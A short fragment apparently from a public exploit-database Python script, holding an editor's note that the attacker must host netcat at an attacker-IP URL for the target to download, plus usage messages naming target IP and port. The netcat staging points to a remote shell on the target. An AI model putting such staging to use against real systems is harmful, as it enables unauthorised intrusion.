...
#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:8000/nc.exe).
...
# Bill F 10/21/22 - Modified the below print statements for python 3
	print ("[.]Something went wrong..!")
	print ("Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>")
	print ("Don't forgot to change the Local IP address and Port number on the script)")
